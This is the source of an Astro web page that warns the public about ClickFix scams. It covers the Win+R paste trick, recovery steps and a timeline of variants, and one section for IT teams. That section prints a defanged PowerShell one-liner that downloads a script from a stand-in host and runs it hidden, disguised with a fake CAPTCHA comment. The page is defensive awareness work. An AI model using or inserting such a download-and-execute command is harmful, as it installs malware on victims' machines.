---
import Layout from "../layouts/Layout.astro";
import Header from "../components/Header.astro";
import Footer from "../components/Footer.astro";
import Demo from "../components/Demo.astro";
import Lures from "../components/Lures.astro";
import Reading from "../components/Reading.astro";

const reviewed = "November 2026";

const keys = [
  { caps: ["Win", "R"], does: "opens the Run box" },
  { caps: ["Ctrl", "V"], does: "pastes the attacker’s command" },
  { caps: ["Enter"], does: "runs it" },
];

const timeline = [
  {
    when: "2024",
    name: "ClickFix appears",
    what: "Fake Word and Chrome errors; PowerShell pasted into Run.",
    source: "Proofpoint",
    url: "https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape",
  },
  {
    when: "Late 2024",
    name: "State hackers adopt it",
    what: "Russia’s APT28, North Korea’s Kimsuky, Iran’s MuddyWater.",
    source: "Proofpoint",
    url: "https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix",
  },
  {
    when: "Jun 2025",
    name: "FileFix",
    what: "Command disguised as a file path, pasted into File Explorer.",
    source: "Kaspersky",
    url: "https://www.kaspersky.com/blog/filefix-attack-windows-file-explorer/54752/",
  },
  {
    when: "2025",
    name: "Macs",
    what: "Encoded one-liners pasted into Terminal; mostly Atomic Stealer.",
    source: "Microsoft",
    url: "https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/",
  },
  {
    when: "Dec 2025",
    name: "ConsentFix",
    what: "Victim pastes back an OAuth sign-in URL. Account takeover, no malware.",
    source: "Push Security",
    url: "https://pushsecurity.com/blog/consentfix-debrief",
  },
  {
    when: "Jan 2026",
    name: "CrashFix",
    what: "Fake extension crashes the browser; the “fix” abuses <code>finger.exe</code>.",
    source: "Microsoft",
    url: "https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/",
  },
  {
    when: "Feb 2026",
    name: "Windows Terminal",
    what: "<kbd>Win</kbd> + <kbd>X</kbd>, <kbd>I</kbd> instead of Run, dodging Run-box policies.",
    source: "SecurityWeek",
    url: "https://www.securityweek.com/clickfix-attack-uses-windows-terminal-to-evade-detection/",
  },
  {
    when: "Mar 2026",
    name: "macOS warns",
    what: "Tahoe 26.4 flags commands pasted into Terminal from the web.",
    source: "MacRumors",
    url: "https://www.macrumors.com/2026/06/16/apple-details-terminal-anti-scam-warning-in-macos/",
  },
  {
    when: "Oct 2026",
    name: "Cache smuggling",
    what: "Payload pre-loaded into the browser cache; no download event.",
    source: "iTnews",
    url: "https://www.itnews.com.au/news/microsoft-spots-new-twist-on-clickfix-cache-smuggling-629401",
  },
];
---

<Layout
  title="ClickFix: no real website will ask you to press these keys"
  description="ClickFix pages trick you into pasting a command that installs malware. Try a safe demo, see what the trap looks like, and what to do if you ran one."
>
  <Header />

  <main id="main">
    <section class="hero wrap" aria-labelledby="hero-title">
      <h1 id="hero-title">No real website will ask you to press these keys.</h1>

      <ol class="keys" aria-label="The key sequence a ClickFix page asks for">
        {keys.map((step) => (
          <li>
            <span class="caps">
              {step.caps.map((cap, i) => (
                <>
                  {i > 0 && <span class="plus" aria-hidden="true">+</span>}
                  <kbd class="cap">{cap}</kbd>
                </>
              ))}
            </span>
            <span class="does">{step.does}</span>
          </li>
        ))}
      </ol>

      <div class="measure">
        <p class="lead">
          If a page asks you to, close it. It’s a scam called ClickFix, and that command installs malware.
        </p>
        <p class="mac-note">On a Mac it’s Terminal and <kbd>⌘</kbd> + <kbd>V</kbd>. Same scam.</p>
        <p class="hero-links">
          <a class="go" href="#demo">Try a safe demo</a>
          <a class="urgent" href="#ran-it">Ran a command? Do this now</a>
        </p>
      </div>
    </section>

    <section class="block wrap" id="demo" aria-labelledby="demo-title">
      <h2 id="demo-title">See how it works</h2>
      <p class="measure">A fake page and a harmless command. Nothing gets downloaded.</p>
      <Demo />
    </section>

    <section class="block wrap" id="looks" aria-labelledby="looks-title">
      <h2 id="looks-title">What it looks like</h2>
      <p class="measure">The disguise changes. The ask doesn’t: copy something, paste it into your computer.</p>
      <Lures />
    </section>

    <section class="ran" id="ran-it" aria-labelledby="ran-title">
      <div class="wrap">
        <h2 id="ran-title">If you ran a command</h2>
        <p class="measure relief">
          Pasted but never pressed <kbd>Enter</kbd>? Nothing ran. Close the box.
        </p>

        <div class="ran-grid">
          <section aria-labelledby="ran-work">
            <h3 id="ran-work">Work computer</h3>
            <ol class="steps">
              <li><strong>Disconnect from the network.</strong> Don’t shut it down.</li>
              <li><strong>Call IT or security now.</strong> Tell them what you pasted and when.</li>
            </ol>
          </section>

          <section aria-labelledby="ran-home">
            <h3 id="ran-home">Personal computer</h3>
            <ol class="steps">
              <li><strong>Disconnect from the internet.</strong></li>
              <li>
                <strong>On another device, secure your email:</strong> new password, then “sign out of all devices”.
                A new password alone won’t kick the attacker out.
              </li>
              <li>
                <strong>Do the same for</strong> your password manager, bank, and Apple, Google or Microsoft account.
                Turn on two-step verification.
              </li>
              <li><strong>Move any crypto</strong> to a new wallet made on a clean device.</li>
              <li><strong>Back up your files, then erase and reinstall</strong> the computer.</li>
            </ol>
          </section>
        </div>
      </div>
    </section>

    <section class="block wrap tech" id="for-it" aria-labelledby="it-title">
      <h2 id="it-title">For IT and security teams</h2>

      <figure class="sample">
        <pre><code>powershell -w h -c "iwr hxxps://cdn-check[.]example/v.ps1 | iex"                                        # ✅ I am not a robot - Verification ID: 4821</code></pre>
        <figcaption>
          Typical Windows payload, defanged. Hidden window, download-and-execute, padded so the Run box shows only
          the comment.
        </figcaption>
      </figure>

      <h3>Timeline</h3>
      <div class="table-scroll" role="region" aria-label="ClickFix timeline" tabindex="0">
        <table class="timeline">
          <tbody>
            {timeline.map((row) => (
              <tr>
                <td class="when">{row.when}</td>
                <td>
                  <strong>{row.name}.</strong> <span set:html={row.what} />
                </td>
                <td class="src"><a href={row.url} rel="noopener noreferrer">{row.source}</a></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <p class="measure more">
        For mitigations and hunting queries, see
        <a href="https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/" rel="noopener noreferrer">Microsoft’s ClickFix analysis</a>.
      </p>
    </section>

    <section class="block wrap" id="reading" aria-labelledby="reading-title">
      <h2 id="reading-title">Sources</h2>
      <div class="measure">
        <Reading />
      </div>
    </section>
  </main>

  <Footer reviewed={reviewed} />
</Layout>

<style>
  /* ---------- Hero ---------- */
  .hero {
    padding-block: clamp(2.5rem, 8vw, 6rem) clamp(2rem, 6vw, 4rem);
  }

  .hero h1 {
    max-width: 15ch;
  }

  .keys {
    display: flex;
    flex-wrap: wrap;
    gap: clamp(1.25rem, 3vw, 2.75rem);
    margin-block: clamp(2rem, 5vw, 3.5rem);
    padding: 0;
    list-style: none;
  }

  .keys li {
    display: grid;
    align-content: start;
    gap: 0.75rem;
    justify-items: start;
  }

  .caps {
    display: flex;
    gap: 0.5rem;
    align-items: center;
  }

  .cap {
    min-width: 2.4em;
    border: 2px solid var(--ink);
    border-bottom-width: 7px;
    border-radius: 12px;
    padding: 0.3em 0.55em 0.25em;
    background: var(--paper);
    font-size: clamp(1.4rem, 4vw, 2.6rem);
    font-weight: 600;
    line-height: 1.1;
  }

  .plus {
    color: var(--muted);
    font-family: var(--mono);
    font-size: clamp(1.1rem, 2.5vw, 1.6rem);
  }

  .does {
    max-width: 15rem;
    color: var(--muted);
    font-family: var(--ui);
    font-size: 0.95rem;
    line-height: 1.35;
  }

  .lead {
    font-size: clamp(1.2rem, 2.2vw, 1.45rem);
    line-height: 1.5;
  }

  .mac-note {
    margin-top: 1rem;
    color: var(--muted);
  }

  .hero-links {
    display: flex;
    flex-wrap: wrap;
    gap: 0.75rem 1.5rem;
    align-items: center;
    margin-top: 2rem;
    font-family: var(--ui);
    font-size: 1rem;
  }

  .go {
    border-radius: 8px;
    padding: 0.8rem 1.2rem;
    background: var(--ink);
    color: var(--paper);
    font-weight: 600;
    text-decoration: none;
  }

  .go:hover {
    background: #343a42;
  }

  .urgent {
    color: var(--stop);
    font-weight: 600;
  }

  /* ---------- Sections ---------- */
  .block {
    padding-top: clamp(3.5rem, 9vw, 6.5rem);
    scroll-margin-top: 1rem;
  }

  .block > h2,
  .ran h2 {
    margin-bottom: 1.25rem;
  }

  .block > h3 {
    margin: 3rem 0 1rem;
  }

  /* ---------- If you ran it ---------- */
  .ran {
    margin-top: clamp(3.5rem, 9vw, 6.5rem);
    padding-block: clamp(2.5rem, 7vw, 4.5rem);
    background: var(--stop-wash);
    scroll-margin-top: 0;
  }

  .ran h2 {
    color: var(--stop-deep);
  }

  .relief {
    font-size: 1.15rem;
  }

  .ran-grid {
    display: grid;
    grid-template-columns: minmax(0, 0.8fr) minmax(0, 1.2fr);
    gap: 2.5rem clamp(2rem, 5vw, 4.5rem);
    margin-top: 2.5rem;
  }

  .ran-grid h3 {
    margin-bottom: 1rem;
  }

  .steps {
    display: grid;
    gap: 0.9rem;
    padding-left: 1.4rem;
  }

  .steps li::marker {
    color: var(--stop-deep);
    font-weight: 700;
  }

  /* ---------- Technical ---------- */
  .more {
    margin-top: 2rem;
  }

  .sample {
    margin-top: 1.5rem;
  }

  .sample pre {
    overflow-x: auto;
    border-radius: 8px;
    padding: 1rem 1.1rem;
    background: var(--ink);
    color: #eef0f2;
    font-size: 0.85rem;
    line-height: 1.6;
  }

  .sample code {
    overflow-wrap: normal;
  }

  .sample figcaption {
    max-width: var(--measure);
    margin-top: 0.6rem;
    color: var(--muted);
    font-size: 1rem;
  }

  .table-scroll {
    overflow-x: auto;
  }

  .timeline {
    width: 100%;
    min-width: 40rem;
    border-collapse: collapse;
    font-size: 1rem;
    line-height: 1.5;
  }

  .timeline th {
    border-bottom: 2px solid var(--ink);
    padding: 0 1rem 0.5rem 0;
    font-family: var(--ui);
    font-size: 0.875rem;
    font-weight: 600;
    text-align: left;
  }

  .timeline td {
    border-bottom: 1px solid var(--rule);
    padding: 0.85rem 1.25rem 0.85rem 0;
    vertical-align: top;
  }

  .timeline .when {
    width: 9rem;
    font-family: var(--ui);
    font-size: 0.9rem;
    white-space: nowrap;
  }

  .timeline .src {
    width: 13rem;
    font-family: var(--ui);
    font-size: 0.9rem;
  }

  @media (max-width: 48rem) {
    .ran-grid {
      grid-template-columns: 1fr;
    }
  }
</style>
